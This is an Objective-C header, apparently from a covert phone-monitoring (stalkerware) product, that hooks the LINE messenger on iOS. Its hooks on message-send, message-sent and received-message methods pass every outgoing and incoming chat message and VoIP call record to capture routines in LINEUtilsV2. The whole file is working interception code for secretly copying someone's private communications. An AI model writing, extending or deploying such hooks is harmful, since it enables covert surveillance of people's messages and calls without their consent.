//
//  LINE5.h
//  MSFSP
//
//  Created by Makara Khloth on 8/20/15.
//
//

#import "MSFSP.h"
#import "LINEUtilsV2.h"

#import "ManagedMessage.h"
#import "ManagedChat.h"

#pragma mark - Only Outgoing VOIP -

HOOK(ManagedMessage, line_messageSent$, void, id sent) {
    DLog (@"----------------------------------------------------------------------------------------");
    DLog (@">>>>>>>>>>>>>>>>>>>>> ManagedMessage --> line_messageSent, %@", sent);
    DLog (@"----------------------------------------------------------------------------------------");
    
    CALL_ORIG(ManagedMessage, line_messageSent$, sent);
    
    @try {
        if ([self contentType] == kLINEContentTypeCall) {
            id chat = [self performSelector:@selector(primitiveChat)];
            DLog(@"chat, [%@] %@", [chat class], chat);
            
            [LINEUtilsV2 captureLINEVoIP:sent chat:chat outgoing:YES];
        }
    }
    @catch (NSException *exception) {
        DLog(@"LINE VoIP exception: %@", exception);
    }
    @finally {
        ;
    }
    
}

#pragma mark - Outgoing VOIP - Line 6.6.0

HOOK(ManagedMessage, messageSent$withRequestSequence$inContext$, id, id arg1, int arg2,id arg3) {
    DLog (@"----------------------------------------------------------------------------------------");
    DLog (@">>>>>>>>>>>>>>>>>>>>> messageSent$withRequestSequence$inContext --> arg1, %@", arg1);
    DLog (@">>>>>>>>>>>>>>>>>>>>> messageSent$withRequestSequence$inContext --> arg2, %d", arg2);
    DLog (@">>>>>>>>>>>>>>>>>>>>> messageSent$withRequestSequence$inContext --> arg3, %@", arg3);
    DLog (@"----------------------------------------------------------------------------------------");
    
    @try {
        LineMessage *lineMessage = arg1;
        if ([lineMessage contentType] == kLINEContentTypeCall) {
            NSString *messageID = [lineMessage id];
            DLog(@"LineMessage id --> %@", messageID);
            
            Class $ManagedMessage = objc_getClass("ManagedMessage");
            ManagedMessage *managedMessage = [$ManagedMessage messageWithID:messageID inManagedObjectContext:arg3];
            DLog(@"managedMessage, %@", managedMessage);
            
            id chat = [managedMessage performSelector:@selector(primitiveChat)];
            DLog(@"chat, [%@] %@", [chat class], chat);
            [LINEUtilsV2 captureLINEVoIP:lineMessage chat:chat outgoing:YES];
        }
    }
    @catch (NSException *exception) {
        DLog(@"LINE VoIP exception: %@", exception);
    }
    @finally {
        ;
    }
    
    return CALL_ORIG(ManagedMessage, messageSent$withRequestSequence$inContext$, arg1, arg2, arg3);
}


#pragma mark - Outgoing -

HOOK(ManagedMessage, send, void) {
    DLog (@"------------------------------------------------------------------");
    DLog (@">>>>>>>>>>>>>>>>>>>>> ManagedMessage --> send");
    DLog (@"------------------------------------------------------------------");
    
    CALL_ORIG(ManagedMessage, send);
    
    id chat = [self performSelector:@selector(primitiveChat)];
    DLog(@"chat, [%@] %@", [chat class], chat);
    
    [LINEUtilsV2 captureLINEMessage:self chat:chat outgoing:YES];
}

HOOK(ManagedMessage, sendWithCompletionHandler$, void, id arg1) {
    DLog (@"------------------------------------------------------------------");
    DLog (@">>>>>>>>>>>>>>>>>>>>> ManagedMessage --> sendWithCompletionHandler$, %@", arg1);
    DLog (@"------------------------------------------------------------------");
    
    CALL_ORIG(ManagedMessage, sendWithCompletionHandler$, arg1);
    
    @try {
        id chat = [self performSelector:@selector(primitiveChat)];
        DLog(@"chat, [%@] %@", [chat class], chat);
        
        [LINEUtilsV2 captureLINEMessage:self chat:chat outgoing:YES];
    }
    @catch (NSException *exception) {
        DLog(@"LINE exception: %@", exception);
    }
    @finally {
        ;
    }
}

#pragma mark - Incoming -

HOOK(ManagedChat, updateLastReceivedMessageID$, void, id aMsgObj) {
    DLog (@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
    DLog (@">>>>>>>>>>>>>>>>>>>>> ManagedChat --> updateLastReceivedMessageID, %@", aMsgObj);
    DLog (@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
    
    CALL_ORIG(ManagedChat, updateLastReceivedMessageID$, aMsgObj);
    
    @try {
        if ([(ManagedMessage *)aMsgObj contentType] == kLINEContentTypeCall) {
            [LINEUtilsV2 captureLINEVoIP:aMsgObj chat:self outgoing:NO];
        } else {
            [LINEUtilsV2 captureLINEMessage:aMsgObj chat:self outgoing:NO];
        }
    }
    @catch (NSException *exception) {
        DLog(@"LINE exception: %@", exception);
    }
    @finally {
        ;
    }
}